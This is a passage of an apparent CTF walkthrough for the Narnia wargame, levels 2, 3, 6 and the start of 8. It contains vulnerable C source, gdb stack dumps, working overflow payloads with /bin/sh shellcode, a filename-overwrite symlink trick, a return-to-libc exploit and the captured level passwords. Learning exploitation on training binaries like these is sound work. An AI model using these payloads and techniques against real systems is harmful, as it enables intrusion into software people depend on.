</span><span class='line'>(gdb) run `python -c 'print "A"*140 + "BBBB"'`
</span><span class='line'>Starting program: /games/narnia/narnia2 `python -c 'print "A"*140 + "BBBB"'`
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x080484a3 in main ()
</span><span class='line'>(gdb) n
</span><span class='line'>Single stepping until exit from function main,
</span><span class='line'>which has no line number information.
</span><span class='line'>0x42424242 in ?? ()</span></code></pre></td></tr></table></div></figure>
Let&#8217;s see the stack after the strcpy, which would tell us the probable address we want to redirect execution.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/80xw $esp+400
</span><span class='line'>0xffffd7e0:   0x0000000f  0xffffd80b  0x00000000  0x00000000
</span><span class='line'>0xffffd7f0:   0x00000000  0x00000000  0x1d000000  0xa9c79d1b
</span><span class='line'>0xffffd800:   0xe1a67367  0xc19fc850  0x6996cde4  0x00363836
</span><span class='line'>0xffffd810:   0x2f000000  0x656d6167  0x616e2f73  0x61696e72
</span><span class='line'>0xffffd820:   0x72616e2f  0x3261696e  0x41414100  0x41414141
</span><span class='line'>0xffffd830:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd840:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd850:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd860:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd870:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd880:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd890:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8a0:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8b0:   0x41414141  0x42424241  0x44580042  0x45535f47
</span><span class='line'>0xffffd8c0:   0x4f495353  0x44495f4e  0x3939383d  0x53003733</span></code></pre></td></tr></table></div></figure>
Let pick a shellcode from shellstorm for a Linux x86 execuve /bin/sh and calculate the number of NOPs
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia2@melinda:~$ python -c 'print len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'
</span><span class='line'>23
</span><span class='line'>narnia2@melinda:~$ bc    
</span><span class='line'>140-23
</span><span class='line'>117
</span><span class='line'>narnia2@melinda:~$ /narnia/narnia2 `python -c 'print "\x90"*117 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"'`
</span><span class='line'>$ cat /etc/narnia_pass/narnia3
</span><span class='line'>vaequeezee
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>
</li>


<li>
In another example <strong>Narnia3</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/stat.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt; </span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>        <span class="kt">int</span>  <span class="n">ifd</span><span class="p">,</span>  <span class="n">ofd</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">ofile</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;/dev/null&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">ifile</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">){</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage, %s file, will send contents of file 2 /dev/null</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* open files */</span>
</span><span class='line'>        <span class="n">strcpy</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>        <span class="k">if</span><span class="p">((</span><span class="n">ofd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ofile</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ofile</span><span class="p">);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">if</span><span class="p">((</span><span class="n">ifd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ifile</span><span class="p">);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* copy from file1 to file2 */</span>
</span><span class='line'>        <span class="n">read</span><span class="p">(</span><span class="n">ifd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="n">write</span><span class="p">(</span><span class="n">ofd</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;copied contents of %s to a safer place... (%s)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">ifile</span><span class="p">,</span><span class="n">ofile</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* close &#39;em */</span>
</span><span class='line'>        <span class="n">close</span><span class="p">(</span><span class="n">ifd</span><span class="p">);</span>
</span><span class='line'>        <span class="n">close</span><span class="p">(</span><span class="n">ofd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
Superkojiman notes explain this best, copied here with permission, thanks superkojiman :)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia3@melissa:/narnia$ ./narnia3 /etc/motd
</span><span class='line'>copied contents of /etc/motd to a safer place... (/dev/null)</span></code></pre></td></tr></table></div></figure>
We can use this program to read the contents of /etc/narnia_pass/narnia4, but the output is written to /dev/null. 

We control the input file and the output file is set as /dev/null. However, because of the way the stack is laid out, we can write past the ifile buffer and overwrite the value of ofile. This lets us replace /dev/null with another file of our choosing. Here&#8217;s what the stack looks like:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+---------+
</span><span class='line'>|  ret    |
</span><span class='line'>|  sfp    |
</span><span class='line'>|  ofd    |
</span><span class='line'>|  ifd    |
</span><span class='line'>|  ofile  |
</span><span class='line'>|  ifile  |
</span><span class='line'>|  buf    |
</span><span class='line'>+---------+ &lt;- esp</span></code></pre></td></tr></table></div></figure>
ifile and ofile are 32-byte arrays. We can compile the program with -ggdb and examine it in gdb

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># gcc -ggdb -m32 -fno-stack-protector -Wl,-z,norelro narnia3.c -o narnia3
</span><span class='line'># gdb -q narnia3
</span><span class='line'>
</span><span class='line'>If we disas main, we can see that strcpy is called at *main+100:
</span><span class='line'>
</span><span class='line'>   0x08048551 &lt;+93&gt;:    lea    0x38(%esp),%eax
</span><span class='line'>   0x08048555 &lt;+97&gt;:    mov    %eax,(%esp)
</span><span class='line'>   0x08048558 &lt;+100&gt;:   call   0x8048400 &lt;strcpy@plt&gt;
</span><span class='line'>   0x0804855d &lt;+105&gt;:   movl   $0x2,0x4(%esp)
</span><span class='line'>   0x08048565 &lt;+113&gt;:   lea    0x58(%esp),%eax
</span><span class='line'>   0x08048569 &lt;+117&gt;:   mov    %eax,(%esp)
</span><span class='line'>
</span><span class='line'>We set a breakpoint there and run the program with the following arguments:
</span><span class='line'>
</span><span class='line'>(gdb) r `python -c 'print "A"*32 + "/tmp/hack"'`
</span><span class='line'>Starting program: /root/wargames/narnia/3/narnia3 `python -c 'print "A"*32 + "/tmp/hack"'`
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048558 in main (argc=2, argv=0xbffff954) at narnia3.c:37
</span><span class='line'>37            strcpy(ifile, argv[1]);
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>At the first breakpoint, we examine the local variables
</span><span class='line'>
</span><span class='line'>(gdb) i locals
</span><span class='line'>ifd = 134514299
</span><span class='line'>ofd = -1208180748
</span><span class='line'>ofile = "/dev/null\000\000\000\000\000\000"
</span><span class='line'>ifile = "x\370\377\277\234\203\004\b\200\020\377\267\214\230\004\b\250\370\377\277\211\206\004\b$\243\374\267\364\237", &lt;incomplete sequence \374\267&gt;
</span><span class='line'>buf = "\370\370\377\267\364\237\374\267\371\234\367\267\245B\352\267h\370\377\277չ\350\267\364\237\374\267\214\230\004\b"
</span><span class='line'>
</span><span class='line'>ofile is set to /dev/null as expected. We'll step to the next instruction and check again.
</span><span class='line'>
</span><span class='line'>(gdb) s
</span><span class='line'>38            if((ofd = open(ofile,O_RDWR)) &lt; 0 ){
</span><span class='line'>(gdb) i locals
</span><span class='line'>ifd = 134514299
</span><span class='line'>ofd = -1208180748
</span><span class='line'>ofile = "/tmp/hack\000\000\000\000\000\000"
</span><span class='line'>ifile = 'A' &lt;repeats 32 times&gt;
</span><span class='line'>buf = "\370\370\377\267\364\237\374\267\371\234\367\267\245B\352\267h\370\377\277չ\350\267\364\237\374\267\214\230\004\b"
</span><span class='line'>
</span><span class='line'>As expected, ofile has been overwritten to /tmp/hack. However ifile is now AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack so in order to read /etc/narnia_pass/narnia4, we need to create a directory AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp and symlink /etc/narnia_pass/narnia4 to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack
</span><span class='line'>
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ mkdir -p AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ ln -s /etc/narnia_pass/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack
</span><span class='line'>
</span><span class='line'>Next we need to create the output file /tmp/hack that ofile points to
</span><span class='line'>
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ touch /tmp/hack
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ chmod 666 /tmp/hack
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ ls -l /tmp/hack
</span><span class='line'>-rw-rw-rw- 1 narnia3 narnia3 0 2012-11-24 22:58 /tmp/hack
</span><span class='line'>
</span><span class='line'>Finally, execute /narnia/narnia3 as follows:
</span><span class='line'>
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ /narnia/narnia3 `python -c 'print "A"*32 + "/tmp/hack"'`
</span><span class='line'>copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack to a safer place... (/tmp/hack)
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ cat /tmp/hack
</span><span class='line'>thaenohtai
</span><span class='line'>��*������e���@�narnia3@melissa:/tmp/skojiman3$</span></code></pre></td></tr></table></div></figure>
</li>

<li>
Let&#8217;s see another example  <strong>Narnia6</strong>.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>
</span><span class='line'>extern char **environ;
</span><span class='line'>
</span><span class='line'>// tired of fixing values...
</span><span class='line'>// - morla
</span><span class='line'>unsigned long get_sp(void) {
</span><span class='line'>       __asm__("movl %esp,%eax\n\t"
</span><span class='line'>               "and $0xff000000, %eax"
</span><span class='line'>               );
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>int main(int argc, char *argv[]){
</span><span class='line'>  char b1[8], b2[8];
</span><span class='line'>  int  (*fp)(char *)=(int(*)(char *))&puts, i;
</span><span class='line'>
</span><span class='line'>  if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }
</span><span class='line'>
</span><span class='line'>  /* clear environ */
</span><span class='line'>  for(i=0; environ[i] != NULL; i++)
</span><span class='line'>      memset(environ[i], '\0', strlen(environ[i]));
</span><span class='line'>  /* clear argz    */
</span><span class='line'>  for(i=3; argv[i] != NULL; i++)
</span><span class='line'>      memset(argv[i], '\0', strlen(argv[i]));
</span><span class='line'>
</span><span class='line'>  strcpy(b1,argv[1]);
</span><span class='line'>  strcpy(b2,argv[2]);
</span><span class='line'>  //if(((unsigned long)fp & 0xff000000) == 0xff000000)
</span><span class='line'>  if(((unsigned long)fp & 0xff000000) == get_sp())
</span><span class='line'>      exit(-1);
</span><span class='line'>  fp(b1);
</span><span class='line'>
</span><span class='line'>  exit(1);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>

Stack is not executable for this binary. This binary is an example of “return-to-libc” attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, rendering the NX bit feature useless (if present) and ridding the attacker of the need to inject their own code.

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bitvijays@kali:~$ gdb -q narnia6
</span><span class='line'>Reading symbols from /home/bitvijays/narnia6...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ checksec 
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>
Let&#8217;s compile the source on the local and check what happens:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bitvijays@kali:~$ gcc -m32 -ggdb -fno-stack-protector -Wall narnia6.c -o narnia61</span></code></pre></td></tr></table></div></figure>
If you see carefully, we passed A*8 + BBBB + &#8221; &#8221; + &#8220;C&#8221;*8 + DDDD, which resulted in
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bitvijays@kali:~$ gdb -q ./narnia61
</span><span class='line'>gdb-peda$ pdisass main
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x080486d2 &lt;+330&gt;:   call   0x8048450 &lt;exit@plt&gt;
</span><span class='line'>   0x080486d7 &lt;+335&gt;:   lea    eax,[esp+0x20]
</span><span class='line'>   0x080486db &lt;+339&gt;:   mov    DWORD PTR [esp],eax
</span><span class='line'>   0x080486de &lt;+342&gt;:   mov    eax,DWORD PTR [esp+0x28]
</span><span class='line'>   0x080486e2 &lt;+346&gt;:   call   eax
</span><span class='line'>   0x080486e4 &lt;+348&gt;:   mov    DWORD PTR [esp],0x1
</span><span class='line'>   0x080486eb &lt;+355&gt;:   call   0x8048450 &lt;exit@plt&gt;
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda$ br *main+346
</span><span class='line'>Breakpoint 1 at 0x80486e2: file narnia6.c, line 48.
</span><span class='line'>gdb-peda$ run `python -c 'print "A"*8 + "BBBB" + " " + "C"*8 + "DDDD"'`
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>   0x80486d7 &lt;main+335&gt;:    lea    eax,[esp+0x20]
</span><span class='line'>   0x80486db &lt;main+339&gt;:    mov    DWORD PTR [esp],eax
</span><span class='line'>   0x80486de &lt;main+342&gt;:    mov    eax,DWORD PTR [esp+0x28]
</span><span class='line'>=&gt; 0x80486e2 &lt;main+346&gt;: call   eax
</span><span class='line'>   0x80486e4 &lt;main+348&gt;:    mov    DWORD PTR [esp],0x1
</span><span class='line'>   0x80486eb &lt;main+355&gt;:    call   0x8048450 &lt;exit@plt&gt;
</span><span class='line'>   0x80486f0 &lt;__libc_csu_fini&gt;: push   ebp
</span><span class='line'>   0x80486f1 &lt;__libc_csu_fini+1&gt;:   mov    ebp,esp
</span><span class='line'>Guessed arguments:
</span><span class='line'>arg[0]: 0xffffd380 ("DDDD")
</span><span class='line'>Breakpoint 1, 0x080486e2 in main (argc=0x3, argv=0xffffd444) at narnia6.c:48
</span><span class='line'>48        fp(b1);
</span><span class='line'>gdb-peda$ p b1
</span><span class='line'>$1 = "DDDD\000AAA"
</span><span class='line'>gdb-peda$ p b2
</span><span class='line'>$2 = "CCCCCCCC"
</span><span class='line'>gdb-peda$ p puts
</span><span class='line'>$3 = {&lt;text variable, no debug info&gt;} 0xf7eb3360 &lt;puts&gt;
</span><span class='line'>gdb-peda$ p system
</span><span class='line'>$4 = {&lt;text variable, no debug info&gt;} 0xf7e8bc30 &lt;system&gt;
</span><span class='line'>gdb-peda$ p &b1
</span><span class='line'>$5 = (char (*)[8]) 0xffffd380
</span><span class='line'>gdb-peda$ x/50xw 0xffffd350
</span><span class='line'>0xffffd360:   0xffffd380  0xffffd5df  0x0000003b  0x0804874b
</span><span class='line'>0xffffd370:   0x00000003  0xffffd444  0x43434343  0x43434343
</span><span class='line'>0xffffd380:   0x44444444  0x41414100  0x42424242  0x00000000
</span><span class='line'>0xffffd390:   0x08048700  0xf7fb0ff4  0xffffd418  0xf7e66e46
</span><span class='line'>0xffffd3a0:   0x00000003  0xffffd444  0xffffd454  0xf7fde860
</span><span class='line'>gdb-peda$ p fp
</span><span class='line'>$6 = (int (*)(char *)) 0x42424242
</span><span class='line'>gdb-peda$ p &fp
</span><span class='line'>$7 = (int (**)(char *)) 0xffffd388
</span><span class='line'>gdb-peda$ p $fp
</span><span class='line'>$8 = (void *) 0xffffd398</span></code></pre></td></tr></table></div></figure>
The address of fp &#8220;p &fp&#8221; is 0xffffd3888 which has a value of (&#8220;p fp&#8221;) 0x42424242. As previously the stack is NoteXecutable, but stdlib.h is included in the C Program. Stdlib.h includes system call which has an address of (&#8220;p system&#8221;) 0xf7e8bc30. Further DDDD overwrites AAAA with the Null byte.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia6@melinda:/narnia$ ./narnia6 `python -c 'print "A"*8 + "\x40\x1c\xe6\xf7" + " " + "C"*8 + "/bin/sh"'`
</span><span class='line'>$ cat /etc/narnia_pass/narnia7</span></code></pre></td></tr></table></div></figure>
</li>

<li>Let&#8217;s see another example where we have to use a environment variable to invoke a shell <strong>Narnia8</strong>.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="c1">// gcc&#39;s variable reordering fucked things up</span>
</span><span class='line'><span class="c1">// to keep the level in its old style i am </span>
</span><span class='line'><span class="c1">// making &quot;i&quot; global unti i find a fix </span>
</span><span class='line'><span class="c1">// -morla </span>
</span><span class='line'><span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">){</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">blah</span><span class="o">=</span><span class="n">b</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">bok</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
